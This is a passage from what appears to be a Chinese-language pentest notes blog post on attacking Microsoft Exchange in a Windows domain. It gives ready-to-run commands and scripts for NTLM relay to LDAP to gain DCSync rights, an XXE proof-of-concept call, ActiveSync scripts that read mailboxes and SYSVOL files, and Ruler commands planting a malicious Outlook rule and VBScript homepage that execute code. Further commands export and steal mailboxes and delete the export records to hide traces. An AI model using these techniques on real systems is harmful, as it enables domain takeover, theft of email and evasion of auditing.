<p><code>Exchange Windows Permissions,Exchange Trusted Subsystem</code> 组成员都具有Write-ACL权限，则exchange机器拥有添加ACL的权限，所以我们在拿到Exchange机器的http请求的时候，可以将请求Relay到Ldap。由于Relay到的服务端是Ldap,Ldap服务器的默认策略是协商签名，而不是强制签名。是否签名由客户端决定。在SSRF里面发起的请求是http协议，http协议是不要求进行签名。然后由于Exchange机器用户具备WriteACL权限，我们在域内给添加两条acl，acl的受托人可以是任意用户。从而使该用户具备Dcsync的权限。</p>
</li>
<li><p>利用工具：</p>
<ul>
<li><code>privexchange.py</code> : <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a></li>
<li><code>ntlmrelayx.py、secretsdump.py</code> : <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
</li>
<li><p>攻击步骤：</p>
<ol>
<li>使用 <code>ntlmrelayx</code> 监听端口进行等待连接<br><img src="https://p3.ssl.qhimg.com/t01516372c096f87a37.png" srcset="/img/loading.gif" alt="avatar"></li>
<li>发起推送订阅指定所需的URL，Exchange. 服务器将尝试向这个URL发送通知<br><img src="https://p3.ssl.qhimg.com/t017673212a17449f39.png" srcset="/img/loading.gif" alt="avatar"></li>
<li>Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl<br><img src="https://p3.ssl.qhimg.com/t017f6e513d75746385.png" srcset="/img/loading.gif" alt="avatar"></li>
<li>用户即拥有了dcsync权限</li>
</ol>
</li>
<li><p>继承利用工具：<a target="_blank" rel="noopener" href="https://github.com/Ridter/Exchange2domain">https://github.com/Ridter/Exchange2domain</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Exchange2domain.py -ah 10.211.55.2 -u sanfeng -p 1qaz@WSX -d cgdomain.com -th 10.211.55.200 10.211.55.201<br></code></pre></td></tr></table></figure>


</li>
</ul>
<h2 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h2><p>这不是excahnge的漏洞，而是利用了windows ntlm mic（完整性检测）的缺陷，修改ntlm认证包中的签名字段，使smb协议中继不校验签名。</p>
<p>不使用前文中的http协议中继，而是使用SpoolService发起smb请求，通过修改ntlm认证包，强制中继到LDAP。</p>
<p>同样是利用writeacl的问题更改用户权限。</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/206169.html">https://www.freebuf.com/vuls/206169.html</a></p>
<h2 id="Exchange-XXE"><a href="#Exchange-XXE" class="headerlink" title="Exchange  XXE"></a>Exchange  XXE</h2><h3 id="CVE-2020-17141"><a href="#CVE-2020-17141" class="headerlink" title="CVE-2020-17141"></a>CVE-2020-17141</h3><p>脚本：<a target="_blank" rel="noopener" href="http://47.75.197.183/ss/exchange_xxe.py">http://47.75.197.183/ss/exchange_xxe.py</a></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">/poc.py <span class="hljs-params">&lt;target&gt;</span> <span class="hljs-params">&lt;user:pass&gt;</span> <span class="hljs-params">&lt;connectback ip:port（内网IP和端口）&gt;</span>  <span class="hljs-params">&lt;file&gt;</span><br>cve<span class="hljs-number">-2020</span><span class="hljs-number">-17141.</span>py  <span class="hljs-number">192.168</span><span class="hljs-number">.75</span><span class="hljs-number">.142</span>   harryh@exchangedemo.com:user123<span class="hljs-meta"># 192.168.75.1:9090 <span class="hljs-string">&quot;C:/windows/win.ini&quot;</span></span><br></code></pre></td></tr></table></figure>
<p><img src="/img/article/typora-user-images%5Cimage-20210103210935948.png" srcset="/img/loading.gif" alt="image-20210103210935948"></p>
<p>需要删除多于参数：<code>X-OWA-UrlPostData </code></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">GetWacIframeUrlForOneDrive</span><br></code></pre></td></tr></table></figure>


<h2 id="Exchange-Activesync"><a href="#Exchange-Activesync" class="headerlink" title="Exchange Activesync"></a>Exchange Activesync</h2><p>Exchange ActiveSync是一种Microsoft Exchange同步协议，该协议经过优化，以适用于高延迟和低宽带网络。</p>
<p>该协议基于HTTP和XML，使移动设备可以访问其电子邮件、日历、联系人和任务，并且在脱机工作时仍可以继续访问这些信息。</p>
<p>简单理解，计算机用户通过owa(Outlook Web Access)访问邮件资源，手机用户通过eas(Exchange ActiveSync)访问邮件资源</p>
<ul>
<li><p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/peas">https://github.com/FSecureLABS/peas</a></p>
<ul>
<li><p>验证凭据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> peas<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><br><span class="hljs-comment"># Check the credentials are accepted.</span><br>print(<span class="hljs-string">&quot;Auth result:&quot;</span>, client.check_auth())<br></code></pre></td></tr></table></figure></li>
<li><p>读取邮件:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> peas<br><span class="hljs-keyword">import</span> re<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><span class="hljs-comment"># Retrieve emails.</span><br>emails = client.extract_emails()<br><span class="hljs-keyword">for</span> email <span class="hljs-keyword">in</span> emails :<br>    print(<span class="hljs-string">&quot;\r\n&quot;</span>)  <br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:To&gt;(.*?)&lt;/email:To&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;To:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:From&gt;(.*?)&lt;/email:From&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;From:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:Subject&gt;(.*?)&lt;/email:Subject&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;Subject:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:DateReceived&gt;(.*?)&lt;/email:DateReceived&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;DateReceived:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:DisplayTo&gt;(.*?)&lt;/email:DisplayTo&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;DisplayTo:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:ThreadTopic&gt;(.*?)&lt;/email:ThreadTopic&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;ThreadTopic:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:Importance&gt;(.*?)&lt;/email:Importance&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;Importance:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:Read&gt;(.*?)&lt;/email:Read&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;Read:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;airsyncbase:DisplayName&gt;(.*?)&lt;/airsyncbase:DisplayName&gt;&quot;</span>)<br>    <br>    data = pattern_data.findall(email)<br>    <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> data :<br>        print(<span class="hljs-string">&quot;Attachment:&quot;</span>+name)<br>  <br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email2:ConversationIndex&gt;(.*?)&lt;/email2:ConversationIndex&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;ConversationIndex:&quot;</span>+data[<span class="hljs-number">0</span>])<br><br>    index1 = email.find(<span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span>)<br>    index2 = email.find(<span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span>)<br>    filename = data[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;.html&quot;</span><br>    print(<span class="hljs-string">&#x27;[+] Save body to %s&#x27;</span>%(filename))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w+&#x27;</span>) <span class="hljs-keyword">as</span> file_object:<br>            file_object.write(email[index1:index2+<span class="hljs-number">7</span>]) <br></code></pre></td></tr></table></figure></li>
<li><p>访问文件共享:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 列出共享文件：</span><br><span class="hljs-keyword">import</span> peas<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><span class="hljs-comment"># Retrieve a file share directory listing.</span><br>listing = client.get_unc_listing(<span class="hljs-string">r&#x27;\\dc1\SYSVOL&#x27;</span>)<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> listing :<br>   print(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>   <span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> data.items():<br>      print(<span class="hljs-string">&#x27;&#123;key&#125;:&#123;value&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key = key, value = value))<br></code></pre></td></tr></table></figure></li>
<li><p>读取指定共享文件内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取指定共享文件内容</span><br><span class="hljs-keyword">import</span> peas<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><br>data=client.get_unc_file(<span class="hljs-string">r&#x27;\\dc1\SYSVOL\test.com\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\GPT.INI&#x27;</span>)<br>print(data)<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>注：</p>
<p>访问域内共享目录SYSVOL时，路径要加上域控制器的计算机名，而不是域名</p>
<p>正确的写法：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\\</span>dc1<span class="hljs-symbol">\S</span>YSVOL<span class="hljs-symbol">\t</span>est.com<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\&#123;</span>6AC1786C-016F-11D2-945F-00C04fB984F9&#125;<span class="hljs-symbol">\G</span>PT.INI<br></code></pre></td></tr></table></figure>
<p>错误的写法：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\\</span>test.com<span class="hljs-symbol">\S</span>YSVOL<span class="hljs-symbol">\t</span>est.com<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\&#123;</span>6AC1786C-016F-11D2-945F-00C04fB984F9&#125;<span class="hljs-symbol">\G</span>PT.INI<br></code></pre></td></tr></table></figure>
<p>如果掌握了域控制器的计算机名，可以通过Exchange ActiveSync从外网访问域内共享目录SYSVOL中的文件</p>
</li>
</ul>
<h2 id="OUTLOOK-攻击"><a href="#OUTLOOK-攻击" class="headerlink" title="OUTLOOK 攻击"></a>OUTLOOK 攻击</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>outlook允许用户设定规则，在收到特定邮件时执行某动作，执行动作可以是一个可执行文件，但是不可以传参（例如 x.exe -c xxx）。</p>
<p>可以利用ruler来设置规则</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看规则</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug display<br><br><span class="hljs-comment"># 增加规则，收到含有 popashell 的邮件时执行共享内的文件</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug add —location “\\VPS\webdav\shell.bat” —trigger “popashell” —name maliciousrule<br><br><span class="hljs-comment"># 利用ruler发送邮件给自己</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug send —subject popashell —body “this is a <span class="hljs-built_in">test</span> by daiker”<br><br><span class="hljs-comment"># 删除规则</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug delete —id 020000006cfcd8d7<br></code></pre></td></tr></table></figure>
<h3 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h3><p>outlook允许用户加载外部url渲染主页，攻击者可以提交包含恶意代码的主页</p>
<p>同样可利用ruler</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage display<br><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage add —url http://x<br><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage delete<br></code></pre></td></tr></table></figure>
<p>主页内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Language&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;en-us&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=windows-1252&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Outlook<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">clientEventHandlersVBS</span> <span class="hljs-attr">language</span>=<span class="hljs-string">vbscript</span>&gt;</span><br>&lt;!--<br> Sub window_onload()<br><span class="javascript">     <span class="hljs-built_in">Set</span> Application = ViewCtl1.OutlookApplication</span><br><span class="javascript">     <span class="hljs-built_in">Set</span> cmd = Application.CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="javascript">     cmd.Run(<span class="hljs-string">&quot;calc&quot;</span>)</span><br> End Sub<br>--&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;clsid:0006F063-0000-0000-C000-000000000046&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ViewCtl1&quot;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="邮件操作"><a href="#邮件操作" class="headerlink" title="邮件操作"></a>邮件操作</h2><h3 id="pass-hash-to-ews"><a href="#pass-hash-to-ews" class="headerlink" title="pass_hash_to_ews"></a>pass_hash_to_ews</h3><p><a target="_blank" rel="noopener" href="https://github.com/pentest-tools-public/Pass-to-hash-EWS">https://github.com/pentest-tools-public/Pass-to-hash-EWS</a></p>
<p>保存在目录下的inbox文件夹中为eml格式</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pth_to_ews.exe https:<span class="hljs-regexp">//</span>MAIL<span class="hljs-regexp">/ews/</span>exchange.asmx  -U daiker -P 密码  -MType Inbox<br></code></pre></td></tr></table></figure>
<p>发送邮件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pth_to_ews.exe https:<span class="hljs-regexp">//</span>MAIL<span class="hljs-regexp">/ews/</span>exchange.asmx -U daiker -P 密码 -Sendmail -T <span class="hljs-string">&quot;123&quot;</span> -TM zhangjiawei1@Liton-Lab.com -B HTML.txt<br></code></pre></td></tr></table></figure>
<p>搜索邮件内容含有ACL的邮件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pth_to_ews.exe https:<span class="hljs-regexp">//</span>MAIL<span class="hljs-regexp">/ews/</span>exchange.asmx  -U daiker -P 密码 -MType SentItems -Filterstring <span class="hljs-string">&quot;ACL&quot;</span> 搜索ACL<br></code></pre></td></tr></table></figure>
<p>ews接口是基于http的，所以可以利用白银票据伪造http服务以任意用户身份访问，具体操作ews访问exchange资源，可以看：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service/</a></p>
<h2 id="导出邮件"><a href="#导出邮件" class="headerlink" title="导出邮件"></a>导出邮件</h2><h3 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h3><ul>
<li><p>本地导出</p>
<p>指定导出pst</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -PSConsoleFile <span class="hljs-string">&quot;C:\Program Files\Microsoft\Exchange Server\V15\Bin\exshell.psc1&quot;</span> <span class="hljs-string">&quot;New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST&quot;</span><br><br></code></pre></td></tr></table></figure>
<p>按时间,导出 2018 年 1 月 15 日之后的邮件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -PSConsoleFile <span class="hljs-string">&quot;C:\Program Files\Microsoft\Exchange Server\V15\Bin\exshell.psc1&quot;</span> <span class="hljs-string">&quot;New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST -ContentFilter &#123;(Received -gt &#x27;01/15/2018&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure>
<p>按时间导出 PST，导出 2018 年 1 月 15 日到 2019 年 2 月 12 日之间的邮件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -PSConsoleFile <span class="hljs-string">&quot;C:\Program Files\Microsoft\Exchange Server\V15\Bin\exshell.psc1&quot;</span> <span class="hljs-string">&quot;New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST -ContentFilter &#123;(Received -gt &#x27;01/15/2018&#x27;) -and (Received -lt &#x27;2/12/2019&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure></li>
<li><p>远程导出</p>
<p>认证并导出指定账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$Credential</span> = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;EXCHLAB\Administrator&#x27;</span>,(ConvertTo-SecureString -String <span class="hljs-string">&#x27;VMPassw0rd!!&#x27;</span> -AsPlainText -Force)); <br><span class="hljs-variable">$Session</span> = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://EXCH.EXCHLAB.ORG/PowerShell/ -Authentication Kerberos -Credential <span class="hljs-variable">$Credential</span>;<br>Import-PSSession <span class="hljs-variable">$Session</span>;<br>New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST<br>Remove-PSSession <span class="hljs-variable">$Session</span>;<br></code></pre></td></tr></table></figure></li>
<li><p>删除记录（ps导出邮件是会留下记录的）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:<span class="hljs-variable">$FALSE</span><br></code></pre></td></tr></table></figure>
<h3 id="pth-outlook"><a href="#pth-outlook" class="headerlink" title="pth-outlook"></a>pth-outlook</h3></li>
</ul>
<p>本地通过pth导入用户hash</p>
<p>exchange新建用户时选择ntlm认证即可</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/AD/">AD</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/AD/">AD</a>
                    
                      <a class="hover-with-bg" href="/tags/Exchange/">Exchange</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/02/03/ps/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">powershell的应用</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/02/03/editor/">
                        <span class="hidden-mobile">并不全的编辑器漏洞</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
